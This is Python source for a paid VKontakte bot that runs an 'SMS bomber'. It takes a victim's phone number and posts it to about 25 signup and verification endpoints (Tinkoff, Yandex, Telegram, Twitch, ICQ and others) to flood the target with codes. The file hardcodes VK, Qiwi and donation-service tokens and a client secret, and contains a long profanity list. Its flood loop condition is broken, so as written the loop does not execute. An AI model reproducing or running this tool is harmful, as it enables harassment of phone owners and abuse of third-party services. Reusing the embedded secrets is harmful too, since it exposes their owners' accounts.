import vk_api, requests, time, threading, filemath, fake_useragent
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.utils import get_random_id
from vk_api.keyboard import VkKeyboard, VkKeyboardColor

print("Бот запущен!")
keyboard = VkKeyboard(one_time=False)
# 1
keyboard.add_button('Bomber 💣', color=VkKeyboardColor.PRIMARY)
keyboard.add_button('Поддержка 👤', color=VkKeyboardColor.PRIMARY)
keyboard.add_line()
keyboard.add_button('Баланс 💰', color=VkKeyboardColor.PRIMARY)
keyboard.add_button('Пополнить 💳', color=VkKeyboardColor.PRIMARY)

clava2 = VkKeyboard(one_time=False)
clava2.add_button('Оплата Qiwi 🥝', color=VkKeyboardColor.PRIMARY)
clava2.add_line()
clava2.add_openlink_button('Другие способы', link='https://vk.com/bomberru?w=app6887721_-179699905')
clava2.add_line()
clava2.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

clava3 = VkKeyboard(one_time=False)
clava3.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

clava4 = VkKeyboard(one_time=False)
clava4.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

clava5 = VkKeyboard(one_time=False)
clava5.add_openlink_button('Оплатить', link='https://qiwi.com/payment/form/99?amountFraction=00&currency=RUB&extra%5B%27account%27%5D=375296551581')
clava5.add_line()
clava5.add_button('Назад ↩', color=VkKeyboardColor.PRIMARY)

clava6 = VkKeyboard(one_time=False)
clava6.add_button('Запустить', color=VkKeyboardColor.POSITIVE)
clava6.add_button('Назад ↩', color=VkKeyboardColor.SECONDARY)

def check(x):
    file = open('baza.txt', 'r', encoding='utf-8')
    if str(x) in file.read():
        return 1
    else:
        return 0
    file.close()


def adder(x):
    file = open('baza.txt', 'a', encoding='utf-8')
    file.write(f'{x}\n')

    file.close()


UsersId = open("baza.txt", "r")
UsersId2 = set()
for line in UsersId:
    UsersId2.add(line.strip())
UsersId.close()

suser = []
for user in UsersId2:
    suser.append(str(user))


def extract_aarg(aarg):
    return aarg.split()[0]


def extract_arg(arg):
    return arg.split()[1]


def extract_arg2(arg2):
    return arg2.split()[2]


def payment_history_last(my_login, api_access_token, rows_num, next_TxnId, next_TxnDate):
    # сессия для рекуест
    s = requests.Session()
    # добавляем рекуесту headers
    s.headers['authorization'] = 'Bearer ' + api_access_token
    # параметры
    parameters = {'rows': rows_num, 'nextTxnId': next_TxnId, 'nextTxnDate': next_TxnDate}
    # через рекуест получаем платежы с параметрами - parameters
    h = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + my_login + '/payments', params=parameters)
    # обязательно json все объекты в киви апи json
    return h.json()


mylogin = '375296551581'
api_access_token = '13517c96c7e5464cffd881e1906bd6d6'





def Donat():
    while True:
        time.sleep(20)
        user = fake_useragent.UserAgent().random
        headers = {'user_agent': user}
        r = requests.get('https://api.vkdonuts.ru/donates/get', headers=headers,
                          json={'group': '179699905', 'token': 'eebed2afe6f5ec6575f7a55eda9af596ae2a99ec73471a5868',
                                'v': '1', 'len': 1})
        r = r.json()
        time.sleep(20)
        sum = r['list'][0]['amount']
        txnId = r['list'][0]['date']
        comm = r['list'][0]['user']

        a = open("donat.txt", "r")
        lastpay = a.read()
        lastpay = str(lastpay)
        a.close()

        if lastpay == txnId:
            pass
        else:
            try:
                a = open(str(comm) + ".txt", "r")
                a.close()
                filemath.pmms(str(comm) + ".txt", "+" + str(sum))

                a = open("donat.txt", 'w')
                a.write(txnId)
                a.close()
                write_message(int(comm), "На ваш баланс зачисленно " + str(sum) + "р\n\nУдачных покупок!")
            except:
                pass


Don = threading.Thread(target=Donat)
Don.start()


def QiwiCheck(number, api):
    while True:
        time.sleep(30)
        lastPayments = payment_history_last(number, api, '1', '', '')

        num = lastPayments['data'][0]['account']
        sum = lastPayments['data'][0]['sum']['amount']
        comm = lastPayments['data'][0]['comment']
        type = lastPayments['data'][0]['type']
        txnId = lastPayments['data'][0]['txnId']
        txnId = str(txnId)

        a = open("thlp.txt", "r")
        lastpay = a.read()
        lastpay = str(lastpay)
        a.close()

        if lastpay == txnId:
            pass
        else:
            try:
                a = open(str(comm[1:]) + ".txt", "r")
                a.close()
                filemath.pmms(str(comm[1:]) + ".txt", "+" + str(sum))

                a = open("thlp.txt", 'w')
                a.write(txnId)
                a.close()

                write_message(int(comm[1:]), "На ваш баланс зачисленно " + str(sum) + "р\n\nУдачных покупок!")

            except:
                pass


Tqiwi = threading.Thread(target=QiwiCheck, args=(mylogin, api_access_token))
Tqiwi.start()

def bomber(phone, vremya, dds, ddss):
    x = 0
    user = fake_useragent.UserAgent().random
    headers = {'user_agent': user}
    v = int(vremya) * 10
    while x > v:
        x += 1
        try:
            requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={
                    "SignupForm[username]": phone,
                    "SignupForm[device_type]": 3,
                },
            )

        except:
            pass
        try:
            a = requests.post("https://www.citilink.ru/registration/confirm/phone/+" + phone + "/",
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://u.icq.net/api/v32/rapi/auth/sendCode",
                              json={"reqId": "91101-1606335718",
                                    "params": {"phone": phone, "language": "ru-RU", "route": "sms",
                                               "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://youla.ru/web-api/auth/request_code",
                              json={"phone": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={
                "msisdn": phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763"
            }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://eda.yandex.ru/api/v1/user/request_authentication_code",
                              json={"phone_number": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://shop.vsk.ru/ajax/auth/postSms/",
                              data={"phone": phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://ok.ru/dk?cmd=AnonymRecoveryStartPhoneLink&st.cmd=anonymRecoveryStartPhoneLink",
                data={"st.r.phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://nn-card.ru/api/1.0/register",
                              json={"phone": phone, "password": 'DDd7873456'}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                              json={"CellPhone": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://www.tinkoff.ru/api/common/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=uRdqKtttiyJYz6ShCqO076kNyTraz7pa.m1-prod-api56&wuid=8604f6d4327bf4ef2fc2b3efb36c8e35",

                data={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                "https://sayan.rutaxi.ru/ajax_keycode.html?qip=962358614986707810&lang=ru&source=0",

                data={"l": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.modulbank.ru/api/v2/auth/phone",
                              data={"CellPhone": phone[1:]}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://ng-api.webbankir.com/user/v2/create",
                              json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
                                    "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://stavropol.sushi-market.com/sendForm/callMeBack",
                              json={"phone": phone[1:], "name": "Егор"}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://m.tiktok.com/node-a/send/download_link",
                              json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7",
                                    "Mobile": phone[1:],
                                    "page": {"pageName": "home", "launchMode": "direct",
                                             "trafficType": ""}},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://api.sunlight.net/v3/customers/authorization/",
                              data={"phone": phone},
                              headers=headers)
        except:
            pass
        try:
            a = requests.post("https://cloud.mail.ru/api/v2/notify/applink",
                              json={
                                  "phone": "+" + phone,
                                  "api": 2,
                                  "email": 'dgirherfib@gmaqil.com',
                                  "x-email": "x-email",
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://mobile-api.qiwi.com/oauth/authorize",
                              data={
                                  "response_type": "urn:qiwi:oauth:response-type:confirmation-id",
                                  "username": phone,
                                  "client_id": "android-qw",
                                  "client_secret": "zAm4FKq9UnSe7id",
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                              json={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://passport.twitch.tv/register?trusted_request=true",
                              json={
                                  "birthday": {"day": 12, "month": 10, "year": 2000},
                                  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                                  "include_verification_code": True,
                                  "password": 'Danil5564554',
                                  "phone_number": phone,
                                  "username": 'bhtrtrrrtbhtrbhtr',
                              }, headers=headers)
        except:
            pass
        try:
            a = requests.post("https://my.telegram.org/auth/send_password",
                              data={"phone": "+" + phone}, headers=headers)
        except:
            pass
        try:
            a = requests.post(
                'https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                params={'msisdn': phone}, headers=headers)
        except:
            pass


def write_message(sender, message):
    if i == 1:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': keyboard.get_keyboard()})
    if i == 2:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava2.get_keyboard()})
    if i == 3:
        authorize.method('messages.send', {'user_id': sender, 'message': message,
                                           "random_id": get_random_id(),
                                           'keyboard': clava3.get_keyboard()})
    if i == 4:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava4.get_keyboard()})
    if i == 5:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava5.get_keyboard()})
    if i == 6:
        authorize.method('messages.send', {'user_id': sender, 'message': message, "random_id": get_random_id(),
                                           'keyboard': clava6.get_keyboard()})

def rass(soob, xui, govno, jopa):
    if 1 == 1:
        UsersId = open("baza.txt", "r")
        UsersId2 = set()
        for line in UsersId:
            UsersId2.add(line.strip())
        UsersId.close()

        suser = []
        for user in UsersId2:
            suser.append(str(user))
        if a == 1:
            succes = 0
            fail = 0
            for user in suser:
                try:
                    with open(str(user) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(int(user), sms)
                    succes += 1
                except:
                    fail += 1
                    continue
            so_ob = "none"
            write_message("574170405", "Рассылку получило - " + str(succes) + " пользователей")
            write_message("574170405", "Заблокировали бота - " + str(fail) + " пользователей")



sp_mat = ['6ля', '6лядь', '6лять', 'b3ъeб', 'cock', 'cunt', 'e6aль', 'ebal', 'eblan', 'eбaл', 'eбaть', 'eбyч',
          'eбать', 'eбёт', 'eблантий', 'fuck', 'fucker', 'fucking', 'xyёв', 'xyй', 'xyя', 'xуе', 'xую',
          'zaeb', 'zaebal', 'zaebali', 'zaebat', 'архипиздрит', 'ахуел', 'ахуеть', 'бздение', 'бздеть', 'бздех',
          'бздецы', 'бздит', 'бздицы', 'бздло', 'бзднуть', 'бздун', 'бздунья', 'бздюха', 'бздюшка', 'бздюшко',
          'бля', 'блябу', 'блябуду', 'бляд', 'бляди', 'блядина', 'блядище', 'блядки', 'блядовать', 'блядство',
          'блядун', 'блядуны', 'блядунья', 'блядь', 'блядюга', 'блять', 'вафел', 'вафлёр', 'взъебка', 'взьебка',
          'взьебывать', 'въеб', 'въебался', 'въебенн', 'въебусь', 'въебывать', 'выблядок', 'выблядыш', 'выеб',
          'выебать', 'выебен', 'выебнулся', 'выебон', 'выебываться', 'выпердеть', 'высраться', 'выссаться',
          'вьебен', 'гавно', 'гавнюк', 'гавнючка', 'гамно', 'гандон', 'гнид', 'гнида', 'гниды', 'говенка',
          'говенный', 'говешка', 'говназия', 'говнецо', 'говнище', 'говно', 'говноед', 'говнолинк', 'говночист',
          'говнюк', 'говнюха', 'говнядина', 'говняк', 'говняный', 'говнять', 'гондон', 'доебываться', 'долбоеб',
          'долбоёб', 'долбоящер', 'дрисня', 'дрист', 'дристануть', 'дристать', 'дристун', 'дристуха', 'дрочелло',
          'дрочена', 'дрочила', 'дрочилка', 'дрочистый', 'дрочить', 'дрочка', 'дрочун', 'е6ал', 'е6ут', 'мать',
          'мать', 'ёбaн', 'ебaть', 'ебyч', 'ебал', 'ебало', 'ебальник', 'ебан', 'ебанамать', 'ебанат', 'ебаная',
          'ёбаная', 'ебанический', 'ебанный', 'ебанныйврот', 'ебаное', 'ебануть', 'ебануться', 'ёбаную', 'ебаный',
          'ебанько', 'ебарь', 'ебат', 'ёбат', 'ебатория', 'ебать', 'ебать-копать', 'ебаться', 'ебашить', 'ебёна',
          'ебет', 'ебёт', 'ебец', 'ебик', 'ебин', 'ебись', 'ебическая', 'ебки', 'ебла', 'еблан', 'ебливый',
          'еблище', 'ебло', 'еблыст', 'ебля', 'ёбн', 'ебнуть', 'ебнуться', 'ебня', 'ебошить', 'ебская', 'ебский',
          'ебтвоюмать', 'ебун', 'ебут', 'ебуч', 'ебуче', 'ебучее', 'ебучий', 'ебучим', 'ебущ', 'ебырь', 'елда',
          'елдак', 'елдачить', 'жопа', 'жопу', 'заговнять', 'задрачивать', 'задристать', 'задрота', 'зае6', 'заё6',
          'заеб', 'заёб', 'заеба', 'заебал', 'заебанец', 'заебастая', 'заебастый', 'заебать', 'заебаться',
          'заебашить', 'заебистое', 'заёбистое', 'заебистые', 'заёбистые', 'заебистый', 'заёбистый', 'заебись',
          'заебошить', 'заебываться', 'залуп', 'залупа', 'залупаться', 'залупить', 'залупиться', 'замудохаться',
          'запиздячить', 'засерать', 'засерун', 'засеря', 'засирать', 'засрун', 'захуячить', 'заябестая', 'злоеб',
          'злоебучая', 'злоебучее', 'злоебучий', 'ибанамат', 'ибонех', 'изговнять', 'изговняться', 'изъебнуться',
          'ипать', 'ипаться', 'ипаццо', 'Какдвапальцаобоссать', 'конча', 'курва', 'курвятник', 'лох', 'лошарa',
          'лошара', 'лошары', 'лошок', 'лярва', 'малафья', 'манда', 'мандавошек', 'мандавошка', 'мандавошки',
          'мандей', 'мандень', 'мандеть', 'мандища', 'мандой', 'манду', 'мандюк', 'минет', 'минетчик', 'минетчица',
          'млять', 'мокрощелка', 'мокрощёлка', 'мразь', 'мудak', 'мудaк', 'мудаг', 'мудак', 'муде', 'мудель',
          'мудеть', 'муди', 'мудил', 'мудила', 'мудистый', 'мудня', 'мудоеб', 'мудозвон', 'мудоклюй', 'хер', 'хуй',
          'набздел', 'набздеть', 'наговнять', 'надристать', 'надрочить', 'наебать', 'наебет', 'наебнуть',
          'наебнуться', 'наебывать', 'напиздел', 'напиздели', 'напиздело', 'напиздили', 'насрать', 'настопиздить',
          'нахер', 'нахрен', 'нахуй', 'нахуйник', 'ебет', 'ебёт', 'невротебучий', 'невъебенно', 'нехира', 'нехрен',
          'Нехуй', 'нехуйственно', 'ниибацо', 'ниипацца', 'ниипаццо', 'ниипет', 'никуя', 'нихера', 'нихуя',
          'обдристаться', 'обосранец', 'обосрать', 'обосцать', 'обосцаться', 'обсирать', 'объебос', 'обьебос',
          'однохуйственно', 'опездал', 'опизде', 'опизденивающе', 'остоебенить', 'остопиздеть', 'отмудохать',
          'отпиздить', 'отпиздячить', 'отпороть', 'отъебись', 'охуевательский', 'охуевать', 'охуевающий', 'охуел',
          'охуенно', 'охуеньчик', 'охуеть', 'охуительно', 'охуительный', 'охуяньчик', 'охуячивать', 'охуячить',
          'очкун', 'падла', 'падонки', 'падонок', 'паскуда', 'педерас', 'педик', 'педрик', 'педрила', 'педрилло',
          'педрило', 'педрилы', 'пездень', 'пездит', 'пездишь', 'пездо', 'пездят', 'пердануть', 'пердеж',
          'пердение', 'пердеть', 'пердильник', 'перднуть', 'пёрднуть', 'пердун', 'пердунец', 'пердунина',
          'пердунья', 'пердуха', 'пердь', 'переёбок', 'пернуть', 'пёрнуть', 'пи3д', 'пи3де', 'пи3ду', 'пиzдец',
          'пидар', 'пидарaс', 'пидарас', 'пидарасы', 'пидары', 'пидор', 'пидорасы', 'пидорка', 'пидорок', 'пидоры',
          'пидрас', 'пизда', 'пиздануть', 'пиздануться', 'пиздарваньчик', 'пиздато', 'пиздатое', 'пиздатый',
          'пизденка', 'пизденыш', 'пиздёныш', 'пиздеть', 'пиздец', 'пиздит', 'пиздить', 'пиздиться', 'пиздишь',
          'пиздища', 'пиздище', 'пиздобол', 'пиздоболы', 'пиздобратия', 'пиздоватая', 'пиздоватый', 'пиздолиз',
          'пиздонутые', 'пиздорванец', 'пиздорванка', 'пиздострадатель', 'пизду', 'пиздуй', 'пиздун', 'пиздунья',
          'пизды', 'пиздюга', 'пиздюк', 'пиздюлина', 'пиздюля', 'пиздят', 'пиздячить', 'писбшки', 'писька',
          'писькострадатель', 'писюн', 'писюшка', 'хую', 'подговнять', 'подонки', 'подонок', 'подъебнуть',
          'подъебнуться', 'поебать', 'поебень', 'поёбываает', 'поскуда', 'посрать', 'потаскуха', 'потаскушка',
          'похер', 'похерил', 'похерила', 'похерили', 'похеру', 'похрен', 'похрену', 'похуй', 'похуист',
          'похуистка', 'похую', 'придурок', 'приебаться', 'припиздень', 'припизднутый', 'припиздюлина',
          'пробзделся', 'проблядь', 'проеб', 'проебанка', 'проебать', 'промандеть', 'промудеть', 'пропизделся',
          'пропиздеть', 'пропиздячить', 'раздолбай', 'разхуячить', 'разъеб', 'разъеба', 'разъебай', 'разъебать',
          'распиздай', 'распиздеться', 'распиздяй', 'распиздяйство', 'распроеть', 'сволота', 'сволочь', 'сговнять',
          'секель', 'серун', 'серька', 'сестроеб', 'сикель', 'сила', 'сирать', 'сирывать', 'соси', 'спиздел',
          'спиздеть', 'спиздил', 'спиздила', 'спиздили', 'спиздит', 'спиздить', 'срака', 'сраку', 'сраный',
          'сранье', 'срать', 'срун', 'ссака', 'ссышь', 'стерва', 'страхопиздище', 'сука', 'суки', 'суходрочка',
          'сучара', 'сучий', 'сучка', 'сучко', 'сучонок', 'сучье', 'сцание', 'сцать', 'сцука', 'сцуки', 'сцуконах',
          'сцуль', 'сцыха', 'сцышь', 'съебаться', 'сыкун', 'трахае6', 'трахаеб', 'трахаёб', 'трахатель', 'ублюдок',
          'уебать', 'уёбища', 'уебище', 'уёбище', 'уебищное', 'уёбищное', 'уебк', 'уебки', 'уёбки', 'уебок',
          'уёбок', 'урюк', 'усраться', 'ушлепок', 'х_у_я_р_а', 'хyё', 'хyйня', 'хамло', 'хер', 'херня',
          'херовато', 'херовина', 'херовый', 'хитровыебанный', 'хитрожопый', 'хуeм', 'хуе', 'хуё', 'хуевато',
          'хуёвенький', 'хуевина', 'хуево', 'хуевый', 'хуёвый', 'хуек', 'хуёк', 'хуел', 'хуем', 'хуенч', 'хуеныш',
          'хуенький', 'хуеплет', 'хуеплёт', 'хуепромышленник', 'хуерик', 'хуерыло', 'хуесос', 'хуесоска', 'хуета',
          'хуетень', 'хуею', 'хуи', 'хуйком', 'хуйло', 'хуйня', 'хуйрик', 'хуище', 'хуля', 'хую', 'хуюл',
          'хуя', 'хуяк', 'хуякать', 'хуякнуть', 'хуяра', 'хуясе', 'хуячить', 'целка', 'чмо', 'чмошник', 'чмырь',
          'шалава', 'шалавой', 'шараёбиться', 'шлюха', 'шлюхой', 'шлюшка', 'ябывает']

def mat(message, ids):
    user = authorize.method("users.get", {"user_ids": ids})
    fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
    for word in sp_mat:
        a = 0
        s = 0
        b = a + len(word)
        for i in range(len(message)):
            if s < 1:
                if message[a:b] == word:
                    write_message(ids, f"Ну типа пользователь: \n[https://vk.com/id{ids}|{fullname}] 👤 \nСообщение: {reseived_message} \nматершинник ппц")
                    s += 1
                    break
                else:
                    a += 1
                    b += 1



token = "f6864cd7b57dcb6e0f45ed2e97e82c1c959c3f7e37d6f064af5f53f3509996aed8fc511978c0f42d7beaa"
authorize = vk_api.VkApi(token=token)
longpoll = VkLongPoll(authorize)
admin = 574170405 or 173540024
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me:
        try:
            a = open(str(event.user_id) + "c.txt", "r")
            a.close()
        except:
            a = open(str(event.user_id) + "c.txt", "w")
            a.write("1")
            a.close()
        with open(str(event.user_id) + "c.txt", "r") as ca:
            i = ca.read()
            i = int(i)
        try:
            a = open(str(event.user_id) + ".txt", "r")
            a.close()
        except:
            a = open(str(event.user_id) + ".txt", "w")
            a.write("1")
            a.close()
            write_message(event.user_id, 'На ваш баланс зачислен бонус: \n1 руб 💰')
        with open(str(event.user_id) + ".txt", "r") as ba2:
            bal2 = ba2.read()
            bal2 = int(bal2)
        reseived_message = event.text.lower()
        sender = event.user_id
        user = authorize.method("users.get", {"user_ids": event.user_id})  # вместо 1 подставляете айди нужного юзера
        name = user[0]['first_name']
        mat(reseived_message, sender)
        if reseived_message == 'начать' and i == 1 \
                or reseived_message == 'начать' and i == 1 \
                or reseived_message == 'привет' and i == 1 \
                or reseived_message == 'ку' and i == 1 \
                or reseived_message == 'хай' and i == 1 \
                or reseived_message == 'здравствуйте' and i == 1 \
                or reseived_message == 'start' and i == 1 \
                or reseived_message == 'дарова' and i == 1:
            if check(sender) == 0:
                adder(sender)
                try:
                    a = open(str(sender) + ".txt", "r")
                    a.close()
                except:
                    a = open(str(sender) + ".txt", "w")
                    a.write("1")
                    a.close()
                    write_message(sender, 'На ваш баланс зачислен бонус: \n1 руб 💰')
                with open(str(event.user_id) + ".txt", "r") as ba2:
                    bal2 = ba2.read()
                    bal2 = int(bal2)
            write_message(sender, "Привет " + name + '! \nРады видеть тебя в нашей группе 😊')
            write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Поддержка \n- Баланс \n- Пополнить')

        elif reseived_message[0:6] == 'bomber':
            try:
                a = open(str(event.user_id) + "ph.txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + "ph.txt", "w")
                a.write("1")
                a.close()
            with open(str(event.user_id) + "ph.txt", "r") as cha:
                hi = cha.read()
                hi = int(hi)
            a = open(str(sender) + "c.txt", "w")
            a.write("4")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            if hi == 0:
                write_message(sender, 'Введите номер и время действия бомбера (в минутах): \nЦена: 1₽ = 1мин 💰\nПример: 79287777777 5')
            else:
                write_message(sender,
                              'Рекомендую проверить бомбер на себе, для этого мы выдали Вам 1 руб. ❗ \n\nВведите номер и время действия бомбера (в минутах): \nЦена: 1₽ = 1мин 💰\nПример: 79287777777 5')

        elif (reseived_message[0:11])[0:2] == "79" and len(extract_aarg(reseived_message[0:11])) == 11 and i == 4:
            try:
                try:
                    a = open(str(event.user_id) + ".txt", "r")
                    a.close()
                except:
                    a = open(str(event.user_id) + ".txt", "w")
                    a.write("0")
                    a.close()
                with open(str(event.user_id) + ".txt", "r") as ba2:
                    bal2 = ba2.read()
                    bal2 = int(bal2)
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                if str(int(extract_arg(reseived_message))) > str(0):
                    mony = str(int(extract_arg(reseived_message)))
                    nomber = str(int(extract_aarg(reseived_message)))
                    if str(bal2) >= str(int(extract_arg(reseived_message))):
                        nom = threading.Thread(target=bomber, args=(nomber, mony, 1, 2))
                        nom.start()
                        a = open(str(sender) + ".txt", "w")
                        a.write(str(int(bal2) - int(extract_arg(reseived_message))))
                        a.close()
                        with open(str(event.user_id) + ".txt", "r") as ba2:
                            bal2 = ba2.read()
                            bal2 = int(bal2)
                        with open(str(event.user_id) + "ph.txt", "r") as cha:
                            hi = cha.read()
                            hi = int(hi)
                        a = open(str(sender) + "ph.txt", "w")
                        a.write('0')
                        a.close()

                        write_message(sender, '💣 Спам запущен!')
                    else:
                        a = open(str(sender) + "c.txt", "w")
                        a.write("2")
                        a.close()
                        with open(str(sender) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                        write_message(sender, 'У вас недостаточно средств 😞')
                else:
                    a = open(str(sender) + "c.txt", "w")
                    a.write("2")
                    a.close()
                    with open(str(sender) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(sender, 'Баланс меньше 1 руб 💰')
            except:
                a = open(str(sender) + "c.txt", "w")
                a.write("4")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                write_message(sender, 'Вы не указали количество минут после номера...')
        elif reseived_message[0:5] == 'назад' and i == 2 or reseived_message[0:5] == 'назад' and i == 3 or reseived_message[0:5] == 'назад' and i == 4:
            a = open(str(sender) + "c.txt", "w")
            a.write("1")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Баланс \n- Пополнить')
        elif reseived_message[0:5] == 'назад' and i == 5:
            a = open(str(sender) + "c.txt", "w")
            a.write("2")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, 'Выбери cпособ пополнения 💳')
        elif reseived_message[0:6] == "баланс":
            try:
                a = open(str(event.user_id) + ".txt", "r")
                a.close()
            except:
                a = open(str(event.user_id) + ".txt", "w")
                a.write("1")
                a.close()
                write_message(sender, 'На ваш баланс зачислен бонус: \n1 руб 💰')
            with open(str(event.user_id) + ".txt", "r") as ba2:
                bal2 = ba2.read()
                bal2 = int(bal2)
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, "Твой баланс: " + str(bal2) + " руб 💰")

        elif reseived_message[0:9] == 'поддержка':
            a = open(str(sender) + "c.txt", "w")
            a.write("3")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, 'Введите ваш вопрос 🤔\nНаш администратор обязательно его рассмотрит 👤')
        elif reseived_message[0:9] == "пополнить" and i != 3:
            a = open(str(sender) + "c.txt", "w")
            a.write("2")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, "Выберите способ оплаты")
        elif reseived_message[0:11] == "оплата qiwi" and i == 2:
            a = open(str(sender) + "c.txt", "w")
            a.write("5")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, 'Кошелек для платежа: +375296551581 \n Примечание к платежу: ' + "1" + str(sender) + ' ❗ \n\nТак же оплатить можно с помощью карты (выбирается на сайте). \n\nПосле оплаты на Ваш баланс будет зачислена сумма перевода. Об этом вас уведомят.')
        elif reseived_message[0:4] == 'меню':
            a = open(str(sender) + "c.txt", "w")
            a.write("1")
            a.close()
            with open(str(sender) + "c.txt", "r") as ca:
                i = ca.read()
                i = int(i)
            write_message(sender, 'Вы в главном меню: \n\n- Bomber \n- Поддержка \n- Баланс \n- Пополнить')
        elif reseived_message[0:2] == "фф":
            if sender == admin:
                try:
                    id = extract_arg(reseived_message)
                    bal = extract_arg2(reseived_message)
                    a = open(str(id) + ".txt", "r")
                    skoko = a.read()
                    skoko = int(skoko)
                    a.close()
                    a = open(str(id) + ".txt", "w")
                    a.write(str(skoko + int(bal)))
                    a.close()
                    write_message(event.user_id, "Готово")
                    write_message(str(id), "На ваш баланс зачислено " + str(bal) + " руб.")
                except:
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                    write_message(event.user_id, "Вы не указали айди или сумму")
            else:
                with open(str(event.user_id) + "c.txt", "r") as ca:
                            i = ca.read()
                            i = int(i)
                write_message(sender, 'Вы не являетесь администратором 👤')
        elif reseived_message[0:8] == "рассылка":
            if sender == admin:
                a = 0
                try:
                    sm = extract_arg(event.text)
                    a = 1
                except:
                    write_message(event.user_id, "Вы не указали текст для рассылки")
                if a == 1:
                    with open(str(event.user_id) + "c.txt", "r") as ca:
                        i = ca.read()
                        i = int(i)
                    write_message(event.user_id, "Рссылка началась")
                    sms = event.text[8:]
                    so_ob = sms
                    t = threading.Thread(target=rass, args=(sms, 1, 2, 3))
                    t.start()
            else:
                write_message(sender, 'Вы не являетесь администратором 👤')
        else:
            if i == 1:
                write_message(sender, 'Я тя не понял :/')
            elif i == 4:
                write_message(sender, 'Введите номер нормально ⛔')
            elif i == 3:
                a = open(str(sender) + "c.txt", "w")
                a.write("1")
                a.close()
                with open(str(sender) + "c.txt", "r") as ca:
                    i = ca.read()
                    i = int(i)
                user = authorize.method("users.get", {"user_ids": sender})
                fullname = user[0]['first_name'] + ' ' + user[0]['last_name']
                write_message(173540024, f'Тебя зовёт: [https://vk.com/id{sender}|{fullname}] 👤 \nСообщение: {reseived_message} ')
                write_message(sender, 'Спасибо за обращение. \nМодератор ответит Вам в ближайшее время. 👤')
            elif i == 2:
                write_message(sender, 'Выбери способ пополнения 💳')
            else:
                write_message(sender, 'Я тя не понял :/')

